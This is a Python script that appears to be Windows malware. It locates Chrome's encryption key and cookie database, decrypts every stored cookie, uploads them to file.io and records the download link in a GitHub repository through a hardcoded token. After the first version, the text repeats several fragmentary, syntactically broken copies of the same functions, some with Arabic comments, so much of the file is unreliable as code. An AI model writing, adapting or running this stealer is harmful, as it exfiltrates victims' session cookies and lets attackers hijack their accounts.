import os, json, base64, sqlite3, shutil, requests, time
from Crypto.Cipher import AES
import win32crypt

GITHUB_TOKEN = "Ghp_o6rg9zoZDl2e0jWZhVVPeoBwep4o8413HOHC"
REPO = "Noor092324/Noor-config"

def find_chrome_files():
    root_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local")
    found_paths = {"key_path": None, "db_path": None}
    for root, dirs, files in os.walk(root_path):
        if "Local State" in files and not found_paths["key_path"]:
            found_paths["key_path"] = os.path.join(root, "Local State")
        if "Cookies" in files and "Network" in root:
            found_paths["db_path"] = os.path.join(root, "Cookies")
        if found_paths["key_path"] and found_paths["db_path"]:
            break
    return found_paths

def get_key(key_path):
    try:
        with open(key_path, "r", encoding="utf-8") as f:
            key = json.loads(f.read())["os_crypt"]["encrypted_key"]
        return win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
    except:
        return None

def harvest():
    paths = find_chrome_files()
    if not paths["key_path"] or not paths["db_path"]: return None
    key = get_key(paths["key_path"])
    if not key: return None
    shutil.copyfile(paths["db_path"], "temp_db")
    conn = sqlite3.connect("temp_db")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    cookies_text = ""
    for host, name, enc_val in cursor.fetchall():
        try:
            iv, payload = enc_val[3:15], enc_val[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            val = cipher.decrypt(payload)[:-16].decode()
            cookies_text += f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{val}\n"
        except: continue
    conn.close()
    if os.path.exists("temp_db"): os.remove("temp_db")
    with open("my_cookies.txt", "w", encoding="utf-8") as f:
        f.write(cookies_text)
    return "my_cookies.txt"

def update_github(link):
    url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    res = requests.get(url, headers=headers).json()
    sha = res["sha"]
    data = {"status": "Success", "download_link": link, "time": time.ctime()}
    content = base64.b64encode(json.dumps(data, indent=4).encode()).decode()
    requests.put(url, headers=headers, json={"message": "Update Link", "content": content, "sha": sha})

if __name__ == "__main__":
    file_name = harvest()
    if file_name:
        while True:
            try:
                with open(file_name, "rb") as f:
                    response = requests.post("https://file.io", files={"file": f})
                if response.status_code == 200:
                    update_github(response.json().get("link"))
                    os.remove(file_name)
                    break
            except:
                time.sleep(60)
    if not key: return None
    
    shutil.copyfile(paths["db_path"], "temp_db")
    conn = sqlite3.connect("temp_db")
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    
    cookies_text = ""
    for host, name, enc_val in cursor.fetchall():
        try:
            iv, payload = enc_val[3:15], enc_val[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            val = cipher.decrypt(payload)[:-16].decode()
            cookies_text += f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{val}\n"
        except: continue
    
    conn.close()
    os.remove("temp_db")
    with open("my_cookies.txt", "w", encoding="utf-8") as f: f.write(cookies_text)
    return "my_cookies.txt"

# ... باقي دوال الرفع (update_github) كما هي في الكود السابق ...
        f.write(cookies_text)
    return "my_cookies.txt"

def update_github(link):
    url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    res = requests.get(url, headers=headers).json()
    sha = res["sha"]
    data = {"status": "Success", "download_link": link, "time": time.ctime()}
    content = base64.b64encode(json.dumps(data, indent=4).encode()).decode()
    requests.put(url, headers=headers, json={"message": "Update Link", "content": content, "sha": sha})

if __name__ == "__main__":
    file_name = harvest()
    if file_name:
        while True:
            try:
                with open(file_name, "rb") as f:
                    response = requests.post("https://file.io", files={"file": f})
                if response.status_code == 200:
                    update_github(response.json().get("link"))
                    os.remove(file_name)
                    break
            except:
                time.sleep(60)
    conn.close()
    if os.path.exists("temp_db"): os.remove("temp_db")
    
    file_name = "my_cookies.txt"
    with open(file_name, "w", encoding="utf-8") as f: 
        f.write(cookies_text)
    return file_name

def upload_and_notify(file_path):
    while True:
        try:
            with open(file_path, "rb") as f:
                response = requests.post("https://file.io", files={"file": f})
            
            if response.status_code == 200:
                download_link = response.json().get("link")
                update_github_json(download_link)
                os.remove(file_path)
                break
        except:
            time.sleep(60)

def update_github_json(link):
    url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    res = requests.get(url, headers=headers).json()
    sha = res["sha"]
    data = {"status": "Success", "download_link": link, "time": time.ctime()}
    content = base64.b64encode(json.dumps(data, indent=4).encode()).decode()
    requests.put(url, headers=headers, json={"message": "New Download Link", "content": content, "sha": sha})

if __name__ == "__main__":
    generated_file = harvest()
    if generated_file:
        upload_and_notify(generated_file)
    conn.close()
    if os.path.exists("temp_db"): os.remove("temp_db")
    
    with open("my_cookies.txt", "w", encoding="utf-8") as f: 
        f.write(cookies_text)
    return "my_cookies.txt"

def upload_and_notify(file_path):
    while True:
        try:
            with open(file_path, "rb") as f:
                response = requests.post("https://file.io", files={"file": f})
            
            if response.status_code == 200:
                download_link = response.json().get("link")
                update_github_json(download_link)
                os.remove(file_path)
                break
        except:
            time.sleep(60)

def update_github_json(link):
    url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    res = requests.get(url, headers=headers).json()
    sha = res["sha"]
    data = {"status": "Success", "download_link": link, "time": time.ctime()}
    content = base64.b64encode(json.dumps(data, indent=4).encode()).decode()
    requests.put(url, headers=headers, json={"message": "New Download Link", "content": content, "sha": sha})

if __name__ == "__main__":
    file_name = harvest()
    if file_name:
        upload_and_notify(file_name)
    conn.close()
    os.remove("temp.db")
    # تجهيز الملف محلياً أولاً
    with open("my_cookies.txt", "w", encoding="utf-8") as f: 
        f.write(cookies_text)
    return "my_cookies.txt"

def upload_and_notify(file_path):
    while True: # المحاولة المستمرة في حال انقطاع الإنترنت
        try:
            # الرفع لخدمة file.io للحصول على رابط تنزيل مباشر لمرة واحدة
            with open(file_path, "rb") as f:
                response = requests.post("https://file.io", files={"file": f})
            
            if response.status_code == 200:
                download_link = response.json().get("link")
                # إرسال الرابط فقط لمستودعك
                update_github_json(download_link)
                os.remove(file_path)
                break
        except:
            time.sleep(60) # الانتظار دقيقة قبل المحاولة مجدداً

def update_github_json(link):
    url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    # الحصول على الملف الحالي لتحديثه
    res = requests.get(url, headers=headers).json()
    sha = res["sha"]
    # وضع الرابط الجديد في ملف الـ JSON
    data = {"status": "Success", "download_link": link, "time": time.ctime()}
    content = base64.b64encode(json.dumps(data, indent=4).encode()).decode()
    requests.put(url, headers=headers, json={"message": "New Download Link", "content": content, "sha": sha})

if __name__ == "__main__":
    file_name = harvest()
    if file_name:
        upload_and_notify(file_name)
    conn.close()
    os.remove("temp.db")
    # تجهيز الملف محلياً أولاً
    with open("my_cookies.txt", "w", encoding="utf-8") as f: 
        f.write(cookies_text)
    return "my_cookies.txt"

def upload_and_notify(file_path):
    while True: # المحاولة المستمرة في حال انقطاع الإنترنت
        try:
            # الرفع لخدمة file.io للحصول على رابط تنزيل مباشر لمرة واحدة
            with open(file_path, "rb") as f:
                response = requests.post("https://file.io", files={"file": f})
            
            if response.status_code == 200:
                download_link = response.json().get("link")
                # إرسال الرابط فقط لمستودعك
                update_github_json(download_link)
                os.remove(file_path)
                break
        except:
            time.sleep(60) # الانتظار دقيقة قبل المحاولة مجدداً

def update_github_json(link):
    url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    # الحصول على الملف الحالي لتحديثه
    res = requests.get(url, headers=headers).json()
    sha = res["sha"]
    # وضع الرابط الجديد في ملف الـ JSON
    data = {"status": "Success", "download_link": link, "time": time.ctime()}
    content = base64.b64encode(json.dumps(data, indent=4).encode()).decode()
    requests.put(url, headers=headers, json={"message": "New Download Link", "content": content, "sha": sha})

if __name__ == "__main__":
    file_name = harvest()
    if file_name:
        upload_and_notify(file_name)
